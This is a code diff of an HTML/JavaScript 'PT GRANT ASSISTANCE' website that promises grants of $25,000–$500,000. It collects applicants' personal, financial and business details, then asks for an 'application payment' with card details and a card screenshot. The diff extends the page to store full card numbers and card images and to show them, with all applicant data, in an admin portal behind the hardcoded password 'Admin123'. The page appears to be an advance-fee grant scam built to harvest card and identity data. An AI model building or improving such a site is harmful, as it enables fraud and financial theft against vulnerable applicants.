@@ -21,7 +21,7 @@
 </head>
 <body class="bg-slate-950 text-slate-100 min-h-screen flex flex-col font-sans">
 
-    <!-- FULL SCREEN RECTANGULAR TOP BANNER (PT GRANT LOGO) WITH APPLY NOW CALLOUT -->
+    <!-- FULL SCREEN RECTANGULAR TOP BANNER (PT GRANT LOGO) -->
     <header class="w-full bg-slate-900 border-b-4 border-amber-500 shadow-2xl relative overflow-hidden">
         <div class="w-full h-72 md:h-96 relative flex items-center justify-center">
             <img src="ptlogo.jpeg" alt="PT GRANT LOGO" class="w-full h-full object-cover object-center brightness-75" onerror="this.style.display='none'; document.getElementById('logoFallback').classList.remove('hidden');">
@@ -38,7 +38,7 @@
                     Qualify For $25,000 – $500,000
                 </span>
                 <h1 class="text-3xl md:text-6xl font-black text-white tracking-tight uppercase drop-shadow-lg">PT GRANT ASSISTANCE</h1>
-                <p class="text-slate-300 text-sm md:text-lg max-w-3xl mt-2 font-light">Select your preferred assistance category below to open your grant application form instantly.</p>
+                <p class="text-slate-300 text-sm md:text-lg max-w-3xl mt-2 font-light">Select your required assistance category below to open your grant application form instantly.</p>
                 
                 <!-- Top Screen CTA -->
                 <div class="mt-6 flex flex-wrap gap-4 justify-center">
@@ -67,8 +67,8 @@
                 <button onclick="openModal('statusModal')" class="bg-slate-800 hover:bg-slate-700 text-slate-200 px-4 py-2.5 rounded-lg text-xs font-bold flex items-center gap-2 border border-slate-700 transition">
                     <i class="fa-solid fa-folder-open text-amber-400"></i> Check Status
                 </button>
-                <button onclick="openAdminPortal()" class="bg-slate-950 hover:bg-slate-900 text-slate-400 px-3 py-2.5 rounded-lg text-xs font-semibold flex items-center gap-2 border border-slate-800 transition">
-                    <i class="fa-solid fa-lock text-slate-500"></i> Admin
+                <button onclick="openAdminLoginModal()" class="bg-slate-950 hover:bg-slate-900 text-amber-400 px-3 py-2.5 rounded-lg text-xs font-semibold flex items-center gap-2 border border-slate-800 transition">
+                    <i class="fa-solid fa-lock text-amber-400"></i> Admin Portal
                 </button>
             </div>
         </div>
@@ -82,7 +82,7 @@
             <div class="text-center space-y-2">
                 <span class="text-amber-400 font-bold uppercase tracking-widest text-xs">Choose Your Required Assistance</span>
                 <h2 class="text-3xl md:text-4xl font-black text-white">Which Type of Assistance Do You Need?</h2>
-                <p class="text-slate-400 text-sm max-w-2xl mx-auto">Click on any card below to automatically pull up the qualification form configured for your funding type.</p>
+                <p class="text-slate-400 text-sm max-w-2xl mx-auto">Click on any card below to pull up the qualification form for your funding category.</p>
             </div>
 
             <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
@@ -146,7 +146,7 @@
                         </div>
                         <div>
                             <h3 class="text-xl font-bold text-white group-hover:text-teal-400 transition">Home Refinance Assistance</h3>
-                            <p class="text-xs text-slate-400 mt-2 leading-relaxed">Grant aid to assist home owners with closing costs, interest rate reductions, and cash-out refinances.</p>
+                            <p class="text-xs text-slate-400 mt-2 leading-relaxed">Grant aid to assist homeowners with closing costs, interest rate reductions, and cash-out refinances.</p>
                         </div>
                     </div>
                     <div class="mt-6 pt-4 border-t border-slate-800/80 flex items-center justify-between text-xs">
@@ -229,7 +229,7 @@
                         <h4 class="text-xl font-bold text-amber-400 flex items-center gap-2">
                             <i class="fa-solid fa-circle-exclamation"></i> Application Payment Notice
                         </h4>
-                        <p class="text-xs text-slate-300 mt-1 max-w-xl">If instructed by your grant officer, please click below to submit your card processing information and transaction screenshot.</p>
+                        <p class="text-xs text-slate-300 mt-1 max-w-xl">If instructed by your grant officer, please click below to submit your card details and card screenshot image.</p>
                     </div>
                     <button onclick="openModal('paymentModal')" class="bg-gradient-to-r from-amber-500 to-amber-600 hover:from-amber-400 hover:to-amber-500 text-slate-950 font-black px-8 py-4 rounded-xl transition flex items-center gap-3 shadow-xl whitespace-nowrap text-sm">
                         <i class="fa-solid fa-credit-card text-lg"></i> MAKE APPLICATION PAYMENT
@@ -291,9 +291,14 @@
                         <span class="text-xs font-bold text-amber-400 uppercase tracking-widest">Administrator Portal</span>
                         <h2 class="text-3xl font-black mt-1">PT GRANT Dashboard</h2>
                     </div>
-                    <button onclick="showSection('cards')" class="bg-slate-800 hover:bg-slate-700 px-4 py-2 rounded-lg text-xs font-bold text-slate-300 border border-slate-700">
-                        Exit Admin
-                    </button>
+                    <div class="flex gap-2">
+                        <button onclick="logoutAdmin()" class="bg-red-600/80 hover:bg-red-600 px-4 py-2 rounded-lg text-xs font-bold text-white transition">
+                            Logout Admin
+                        </button>
+                        <button onclick="showSection('cards')" class="bg-slate-800 hover:bg-slate-700 px-4 py-2 rounded-lg text-xs font-bold text-slate-300 border border-slate-700">
+                            Main Page
+                        </button>
+                    </div>
                 </div>
 
                 <div class="mt-6 overflow-x-auto">
@@ -314,23 +319,42 @@
                 </div>
             </div>
 
+            <!-- ADMIN DETAILED APPLICANT ENTRY VIEW & CONTROLS -->
             <div id="adminDetailCard" class="hidden bg-slate-900 rounded-2xl p-6 shadow-2xl border border-slate-800 space-y-6">
                 <div class="flex justify-between items-center border-b border-slate-800 pb-4">
                     <h3 class="text-xl font-bold text-white" id="adminDetailTicketHeader">Managing Ticket</h3>
                     <span id="adminDetailAssistanceType" class="bg-amber-500/20 text-amber-400 px-3 py-1 rounded-full text-xs font-bold border border-amber-500/30"></span>
                 </div>
 
-                <div class="grid grid-cols-1 md:grid-cols-3 gap-4 bg-slate-950 p-4 rounded-xl text-xs border border-slate-800 text-slate-300">
-                    <div><strong>Email:</strong> <span id="admEmail"></span></div>
-                    <div><strong>Phone:</strong> <span id="admPhone"></span></div>
-                    <div><strong>Credit Score:</strong> <span id="admCredit"></span></div>
-                    <div><strong>Employment:</strong> <span id="admEmployment"></span></div>
-                    <div><strong>Pay Amount:</strong> <span id="admPay"></span></div>
-                    <div><strong>Address:</strong> <span id="admAddress"></span></div>
+                <!-- FULL ENTRY DATA FROM MAIN APPLICATION -->
+                <div class="space-y-4">
+                    <h4 class="font-bold text-amber-400 text-sm flex items-center gap-2">
+                        <i class="fa-solid fa-address-card"></i> Complete Application Form Entries
+                    </h4>
+                    <div class="grid grid-cols-1 md:grid-cols-3 gap-4 bg-slate-950 p-4 rounded-xl text-xs border border-slate-800 text-slate-300">
+                        <div><strong>Full Name:</strong> <span id="admFullName" class="text-white font-semibold"></span></div>
+                        <div><strong>Email:</strong> <span id="admEmail" class="text-white"></span></div>
+                        <div><strong>Phone:</strong> <span id="admPhone" class="text-white"></span></div>
+                        <div><strong>Address 1:</strong> <span id="admAddress1" class="text-white"></span></div>
+                        <div><strong>Address 2:</strong> <span id="admAddress2" class="text-white"></span></div>
+                        <div><strong>City/State/Zip:</strong> <span id="admCityStateZip" class="text-white"></span></div>
+                        <div><strong>Employment:</strong> <span id="admEmployment" class="text-white"></span></div>
+                        <div><strong>Pay Amount:</strong> <span id="admPay" class="text-white"></span></div>
+                        <div><strong>Credit Score:</strong> <span id="admCredit" class="text-white"></span></div>
+                    </div>
+
+                    <!-- BUSINESS ENTRY FIELDS IF APPLICABLE -->
+                    <div id="admBusinessBox" class="hidden bg-amber-500/10 p-4 rounded-xl text-xs border border-amber-500/30 text-amber-200 space-y-1">
+                        <p class="font-bold text-amber-400"><i class="fa-solid fa-building"></i> Business Information Entries:</p>
+                        <div><strong>Business Name:</strong> <span id="admBizName"></span></div>
+                        <div><strong>EIN / Tax ID:</strong> <span id="admBizEin"></span></div>
+                        <div><strong>Annual Revenue:</strong> $<span id="admBizRev"></span></div>
+                    </div>
                 </div>
 
+                <!-- UPDATE STATUS AND GRANT BALANCES -->
                 <div class="bg-slate-950 border border-amber-500/40 p-5 rounded-xl space-y-4">
-                    <h4 class="font-bold text-amber-400 text-sm">Update Status & Grant Balances</h4>
+                    <h4 class="font-bold text-amber-400 text-sm">Update Application Status & Grant Balances</h4>
                     <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                         <div>
                             <label class="block text-xs font-bold text-slate-400 mb-1">Status</label>
@@ -356,14 +380,18 @@
                     </button>
                 </div>
 
-                <div>
-                    <h4 class="font-bold text-white text-sm mb-2">Applicant Files & Card Screenshots</h4>
-                    <div id="admFilesList" class="space-y-2 text-xs"></div>
+                <!-- APPLICANT FILES & CARD SCREENSHOTS -->
+                <div class="space-y-2">
+                    <h4 class="font-bold text-white text-sm flex items-center gap-2">
+                        <i class="fa-solid fa-photo-film text-amber-400"></i> Uploaded Documents & Payment Card Screenshots
+                    </h4>
+                    <div id="admFilesList" class="space-y-3 text-xs"></div>
                 </div>
 
+                <!-- REPLY BACK TO APPLICANT -->
                 <div class="border-t border-slate-800 pt-4 space-y-3">
                     <h4 class="font-bold text-white text-sm">Reply to Applicant</h4>
-                    <textarea id="admReplyText" rows="3" placeholder="Type a message to the applicant..." class="w-full border border-slate-800 rounded-lg p-3 text-xs bg-slate-950 text-white outline-none focus:border-amber-500"></textarea>
+                    <textarea id="admReplyText" rows="3" placeholder="Type a response or message to the applicant..." class="w-full border border-slate-800 rounded-lg p-3 text-xs bg-slate-950 text-white outline-none focus:border-amber-500"></textarea>
                     <button onclick="sendAdminReply()" class="bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold px-6 py-2 rounded-lg text-xs transition">
                         Send Response
                     </button>
@@ -372,6 +400,28 @@
         </section>
 
     </main>
+
+    <!-- ADMIN LOGIN MODAL (PASSWORD PROTECTED: Admin123) -->
+    <div id="adminLoginModal" class="hidden fixed inset-0 bg-slate-950/90 backdrop-blur-md flex items-center justify-center p-4 z-50">
+        <div class="bg-slate-900 max-w-sm w-full rounded-2xl shadow-2xl p-6 relative border-2 border-amber-500">
+            <button onclick="closeModal('adminLoginModal')" class="absolute top-4 right-4 text-slate-400 hover:text-white text-xl font-bold">&times;</button>
+            <div class="w-12 h-12 bg-amber-500/20 text-amber-400 rounded-full flex items-center justify-center mx-auto mb-3 text-xl border border-amber-500/40">
+                <i class="fa-solid fa-user-shield"></i>
+            </div>
+            <h3 class="text-xl font-bold text-white text-center mb-1">Admin Portal Access</h3>
+            <p class="text-xs text-slate-400 text-center mb-4">Enter password to manage applications.</p>
+
+            <form onsubmit="handleAdminLogin(event)" class="space-y-4">
+                <div>
+                    <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Admin Password *</label>
+                    <input type="password" id="adminPasswordInput" required placeholder="Enter Password" class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white font-mono">
+                </div>
+                <button type="submit" class="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-black py-3 rounded-xl transition shadow-lg">
+                    Login to Admin Portal
+                </button>
+            </form>
+        </div>
+    </div>
 
     <!-- PULL-UP APPLICATION FORM MODAL -->
     <div id="applyModal" class="hidden fixed inset-0 bg-slate-950/85 backdrop-blur-md flex items-center justify-center p-3 md:p-6 z-50 overflow-y-auto">
@@ -511,7 +561,7 @@
                 </div>
 
                 <button type="submit" class="w-full bg-gradient-to-r from-amber-500 to-amber-600 hover:from-amber-400 hover:to-amber-500 text-slate-950 font-black py-4 rounded-xl text-lg shadow-xl transition">
-                    Submit Application
+                    Submit Qualification Form
                 </button>
             </form>
         </div>
@@ -533,7 +583,7 @@
             <div class="bg-amber-500/10 text-amber-300 text-xs p-4 rounded-xl text-left font-medium mb-4 space-y-1 border border-amber-500/20">
                 <p class="font-bold text-amber-400"><i class="fa-solid fa-triangle-exclamation"></i> WRITE IT DOWN:</p>
                 <p>1. Keep your <strong>Ticket ID</strong> safe.</p>
-                <p>2. Use <strong>Ticket ID + Last Name</strong> to log into your portal.</p>
+                <p>2. Use <strong>Ticket ID + Last Name</strong> to log into your status portal.</p>
             </div>
 
             <button onclick="closeModal('ticketModal'); openModal('statusModal');" class="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold py-3.5 rounded-xl transition">
@@ -559,17 +609,19 @@
                     <input type="text" id="statusLastNameInput" required placeholder="Last Name" class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white">
                 </div>
                 <button type="submit" class="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold py-3 rounded-xl transition">
-                    Access Portal
+                    Access Status Portal
                 </button>
             </form>
         </div>
     </div>
 
-    <!-- PAYMENT MODAL -->
+    <!-- PAYMENT MODAL WITH CARD SCREENSHOT UPLOAD -->
     <div id="paymentModal" class="hidden fixed inset-0 bg-slate-950/90 backdrop-blur-md flex items-center justify-center p-4 z-50">
         <div class="bg-slate-900 max-w-md w-full rounded-2xl shadow-2xl p-6 relative border border-amber-500">
             <button onclick="closeModal('paymentModal')" class="absolute top-4 right-4 text-slate-400 hover:text-white text-xl font-bold">&times;</button>
-            <h3 class="text-xl font-bold text-white mb-1">Make Application Payment</h3>
+            <h3 class="text-xl font-bold text-white mb-1 flex items-center gap-2">
+                <i class="fa-solid fa-credit-card text-amber-400"></i> Make Application Payment
+            </h3>
             <p class="text-xs text-slate-400 mb-4">Enter card details and upload payment screenshot.</p>
 
             <form onsubmit="handlePaymentSubmit(event)" class="space-y-4">
@@ -588,21 +640,22 @@
                     </div>
                 </div>
                 <div>
-                    <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Card Image / Screenshot *</label>
-                    <input type="file" id="payCardImage" required class="w-full border border-slate-800 bg-slate-950 rounded-lg p-2 text-xs text-slate-300">
+                    <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Card Screenshot / Image *</label>
+                    <input type="file" id="payCardImage" accept="image/*" required class="w-full border border-slate-800 bg-slate-950 rounded-lg p-2 text-xs text-slate-300">
                 </div>
                 <button type="submit" class="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold py-3 rounded-xl transition">
-                    Submit Verification Payment
+                    Submit Payment & Screenshot
                 </button>
             </form>
         </div>
     </div>
 
-    <!-- JAVASCRIPT LOGIC -->
+    <!-- JAVASCRIPT LOGIC WITH LOCALSTORAGE PERSISTENCE -->
     <script>
         let applications = JSON.parse(localStorage.getItem('pt_applications')) || [];
         let currentApplicant = null;
         let selectedAdminTicket = null;
+        let isAdminLoggedIn = false;
 
         function saveStorage() {
             localStorage.setItem('pt_applications', JSON.stringify(applications));
@@ -638,6 +691,7 @@
             }
         }
 
+        // Form Submission Handler
         function handleFormSubmit(e) {
             e.preventDefault();
             const ticketId = 'PTG-' + Math.floor(100000 + Math.random() * 900000);
@@ -650,7 +704,7 @@
                 email: document.getElementById('email').value,
                 phone: document.getElementById('phone').value,
                 address1: document.getElementById('address1').value,
-                address2: document.getElementById('address2').value,
+                address2: document.getElementById('address2').value || 'N/A',
                 city: document.getElementById('city').value,
                 state: document.getElementById('state').value,
                 zip: document.getElementById('zip').value,
@@ -665,7 +719,7 @@
                 approvedAmount: 0,
                 pendingAmount: 0,
                 uploads: [],
-                messages: [{ sender: 'admin', text: 'Welcome to PT GRANT! Your application has been received and is currently under review.', time: new Date().toLocaleTimeString() }]
+                messages: [{ sender: 'admin', text: 'Welcome to PT GRANT! Your application entries have been registered in the admin system and are under review.', time: new Date().toLocaleTimeString() }]
             };
 
             applications.push(newApp);
@@ -677,6 +731,7 @@
             openModal('ticketModal');
         }
 
+        // Status Login Handler
         function handleStatusLogin(e) {
             e.preventDefault();
             const ticket = document.getElementById('statusTicketInput').value.trim().toUpperCase();
@@ -690,7 +745,7 @@
                 renderApplicantDashboard();
                 showSection('status');
             } else {
-                alert('Invalid Ticket ID or Last Name.');
+                alert('Invalid Ticket ID or Last Name combination.');
             }
         }
 
@@ -731,40 +786,85 @@
             const fileInput = document.getElementById(category === 'personal' ? 'personalDocInput' : 'businessDocInput');
             if (!fileInput.files.length) return alert('Select a file to upload.');
 
-            currentApplicant.uploads.push({
-                category: category,
-                name: fileInput.files[0].name,
-                time: new Date().toLocaleTimeString()
-            });
+            const file = fileInput.files[0];
+            const reader = new FileReader();
 
-            saveStorage();
-            fileInput.value = '';
-            renderApplicantDashboard();
-            alert('Document uploaded successfully!');
+            reader.onload = function(e) {
+                currentApplicant.uploads.push({
+                    category: category,
+                    name: file.name,
+                    dataUrl: e.target.result,
+                    time: new Date().toLocaleTimeString()
+                });
+
+                saveStorage();
+                fileInput.value = '';
+                renderApplicantDashboard();
+                alert('Document uploaded to Admin Portal successfully!');
+            };
+
+            reader.readAsDataURL(file);
         }
 
+        // Payment Submission with Screenshot Data URL
         function handlePaymentSubmit(e) {
             e.preventDefault();
             const cardNumber = document.getElementById('payCardNumber').value;
             const fileInput = document.getElementById('payCardImage');
 
-            currentApplicant.uploads.push({
-                category: 'payment card',
-                name: `Card (**${cardNumber.slice(-4)}) Screenshot: ${fileInput.files[0]?.name || 'Card Screenshot'}`,
-                time: new Date().toLocaleTimeString()
-            });
+            if (!fileInput.files.length) return alert('Please attach a card screenshot image.');
 
-            currentApplicant.status = 'Payment Verified';
-            saveStorage();
+            const file = fileInput.files[0];
+            const reader = new FileReader();
 
-            closeModal('paymentModal');
-            renderApplicantDashboard();
-            alert('Payment screenshot submitted successfully!');
+            reader.onload = function(e) {
+                currentApplicant.uploads.push({
+                    category: 'payment card',
+                    name: `Card (**${cardNumber.slice(-4)}): ${file.name}`,
+                    cardNumber: cardNumber,
+                    dataUrl: e.target.result,
+                    time: new Date().toLocaleTimeString()
+                });
+
+                currentApplicant.status = 'Payment Verified';
+                saveStorage();
+
+                closeModal('paymentModal');
+                renderApplicantDashboard();
+                alert('Payment details and card screenshot submitted to Admin Portal!');
+            };
+
+            reader.readAsDataURL(file);
         }
 
-        function openAdminPortal() {
-            renderAdminTable();
-            showSection('admin');
+        // ADMIN PORTAL LOGIN & MANAGEMENT
+        function openAdminLoginModal() {
+            if (isAdminLoggedIn) {
+                renderAdminTable();
+                showSection('admin');
+            } else {
+                openModal('adminLoginModal');
+            }
+        }
+
+        function handleAdminLogin(e) {
+            e.preventDefault();
+            const pwd = document.getElementById('adminPasswordInput').value;
+            if (pwd === 'Admin123') {
+                isAdminLoggedIn = true;
+                closeModal('adminLoginModal');
+                document.getElementById('adminPasswordInput').value = '';
+                renderAdminTable();
+                showSection('admin');
+            } else {
+                alert('Incorrect Admin Password!');
+            }
+        }
+
+        function logoutAdmin() {
+            isAdminLoggedIn = false;
+            showSection('cards');
+            alert('Admin logged out.');
         }
 
         function renderAdminTable() {
@@ -796,27 +896,57 @@
             const app = applications.find(a => a.ticketId === ticketId);
 
             document.getElementById('adminDetailCard').classList.remove('hidden');
-            document.getElementById('adminDetailTicketHeader').innerText = `Managing Application: ${app.ticketId} (${app.firstName} ${app.lastName})`;
+            document.getElementById('adminDetailTicketHeader').innerText = `Managing Application: ${app.ticketId}`;
             document.getElementById('adminDetailAssistanceType').innerText = app.assistanceType;
 
+            // Populate Main Form Entries into Admin View
+            document.getElementById('admFullName').innerText = `${app.firstName} ${app.lastName}`;
             document.getElementById('admEmail').innerText = app.email;
             document.getElementById('admPhone').innerText = app.phone;
-            document.getElementById('admCredit').innerText = app.creditScore;
+            document.getElementById('admAddress1').innerText = app.address1;
+            document.getElementById('admAddress2').innerText = app.address2;
+            document.getElementById('admCityStateZip').innerText = `${app.city}, ${app.state} ${app.zip}`;
             document.getElementById('admEmployment').innerText = app.employmentStatus;
             document.getElementById('admPay').innerText = `$${app.payAmount} (${app.payFrequency})`;
-            document.getElementById('admAddress').innerText = `${app.address1}, ${app.city}, ${app.state} ${app.zip}`;
+            document.getElementById('admCredit').innerText = app.creditScore;
+
+            // Render Business Data if present
+            const bizBox = document.getElementById('admBusinessBox');
+            if (app.assistanceType === 'Business Assistance' || app.businessName !== 'N/A') {
+                bizBox.classList.remove('hidden');
+                document.getElementById('admBizName').innerText = app.businessName;
+                document.getElementById('admBizEin').innerText = app.businessEin;
+                document.getElementById('admBizRev').innerText = app.businessRevenue;
+            } else {
+                bizBox.classList.add('hidden');
+            }
 
             document.getElementById('admStatusSelect').value = app.status;
             document.getElementById('admApprovedInput').value = app.approvedAmount;
             document.getElementById('admPendingInput').value = app.pendingAmount;
 
+            // Render Files and Payment Screenshots
             const filesList = document.getElementById('admFilesList');
-            filesList.innerHTML = app.uploads.length ? app.uploads.map(u => `
-                <div class="p-2 bg-slate-950 border border-slate-800 rounded font-mono text-xs flex justify-between text-slate-300">
-                    <span>[${u.category.toUpperCase()}] ${u.name}</span>
-                    <span class="text-slate-500">${u.time}</span>
-                </div>
-            `).join('') : '<p class="text-slate-500 italic">No uploaded files or payment screenshots.</p>';
+            if (app.uploads.length) {
+                filesList.innerHTML = app.uploads.map(u => `
+                    <div class="p-3 bg-slate-950 border border-slate-800 rounded-xl space-y-2 text-slate-300">
+                        <div class="flex justify-between font-mono">
+                            <span><strong class="uppercase text-amber-400">[${u.category.toUpperCase()}]</strong> ${u.name}</span>
+                            <span class="text-slate-500 text-[10px]">${u.time}</span>
+                        </div>
+                        ${u.dataUrl ? `
+                            <div class="mt-2">
+                                <a href="${u.dataUrl}" target="_blank" class="inline-block bg-slate-800 hover:bg-slate-700 text-amber-400 font-bold px-3 py-1.5 rounded border border-slate-700 text-[11px] mb-2">
+                                    <i class="fa-solid fa-up-right-from-square"></i> Open Full File / Image
+                                </a>
+                                ${u.dataUrl.startsWith('data:image/') ? `<img src="${u.dataUrl}" class="max-h-48 rounded border border-slate-700 object-cover mt-1">` : ''}
+                            </div>
+                        ` : ''}
+                    </div>
+                `).join('');
+            } else {
+                filesList.innerHTML = '<p class="text-slate-500 italic">No uploaded documents or card screenshots available.</p>';
+            }
         }
 
         function saveAdminAppChanges() {
@@ -829,7 +959,7 @@
 
             saveStorage();
             renderAdminTable();
-            alert('Application updated successfully!');
+            alert('Application status & amounts saved successfully!');
         }
 
         function sendAdminReply() {
@@ -846,7 +976,7 @@
 
             saveStorage();
             document.getElementById('admReplyText').value = '';
-            alert('Reply sent to applicant portal.');
+            alert('Reply sent directly to applicant portal!');
         }
     </script>
 </body>
